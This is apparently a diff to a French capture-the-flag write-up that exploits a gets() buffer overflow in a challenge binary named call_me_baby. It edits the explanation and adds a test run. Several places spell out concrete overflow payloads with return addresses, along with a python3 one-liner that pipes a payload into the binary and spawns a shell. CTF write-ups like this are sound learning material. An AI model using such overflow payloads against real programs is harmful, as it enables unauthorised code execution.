@@ -79,7 +79,7 @@ Pour ce faire, on va exploiter la fonction gets() dans vuln() qui est vulnérabl
 
 # Payload
 
-Utilisons gdb pour trouver notre exploit :
+Utilisons gdb pour trouver notre exploit. On ajoute un break après la fonction gets() pour observer la mémoire et rentre 64 charactères A pour remplir le buffer utilisé pour récupérer l'entrée de l'utilisateur :
 
 ```console
 $ gdb -q call_me_baby 
@@ -150,8 +150,6 @@ es             0x0                 0
 fs             0x0                 0
 gs             0x0                 0
 ```
-
-On lance gdb, ajoute un break après la fonction gets() pour observer la mémoire et rentre 64 charactères A pour remplir le buffer utilisé pour récupérer l'entrée de l'utilisateur.  
   
 L'addresse à laquelle les fonctions se redirigent après leur execution, est stocké après le rbp dans la stack. En regardant le registre, et l'adresse à laquelle le rbp est stocké on déduit le payload pour rediriger le programme :
 
@@ -195,7 +193,7 @@ On redirige bien le programme vers la fonction call_me(), mais ne passe pas la c
   if (iVar1 == 0) {
 ```
 
-Pour passer cette condition il faut que la varibale local_10 prise en argument par la fonction call_me() soit égale à `baby`.  
+Pour passer cette condition il faut que la variable local_10 prise en argument par la fonction call_me() soit égale à `baby`.  
   
 Deux solutions possibles :
  - Soit modifier le registre pour passer `baby` en argument à la fonction call_me
@@ -415,7 +413,7 @@ ls
 README.md  call_me_baby  exploit.py
 ```
 
-Le payload final est donc `"\x41"*64+"\x62\x61\x62\x79"+"\x00"*4+"\x66\x11\x40\x00"+"\x00"*4+"\x8a\x11\x40\x00"+"\x00"*4`.
+Le shell c'est bien lancé, le payload final est donc `"\x41"*64+"\x62\x61\x62\x79"+"\x00"*4+"\x66\x11\x40\x00"+"\x00"*4+"\x8a\x11\x40\x00"+"\x00"*4`.
 
 ## Solution 2
 
@@ -471,7 +469,18 @@ Error in re-setting breakpoint 2: No symbol "call_me" in current context.
 [Inferior 1 (process 6977) exited normally]
 ```
 
-Le payload est donc `"\x41"*72+"\xb0\x11\x40\x00"+"\x00"*4`.
+On arrive bien au message de succès mais le programme plante en essayant de lancer le shell. Testons le payload directement sur l'executable :
+
+```console
+$ (python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*72+b"\xb0\x11\x40\x00"+b"\x00"*4)' ; tee) | ./call_me_baby 
+Write your love letter: 
+whoami
+coucou
+ls
+README.md  call_me_baby  exploit1.py  exploit2.py
+``
+
+Le shell c'est bien lancé, le payload final est donc `"\x41"*72+"\xb0\x11\x40\x00"+"\x00"*4`.
 
 # Exploit
 
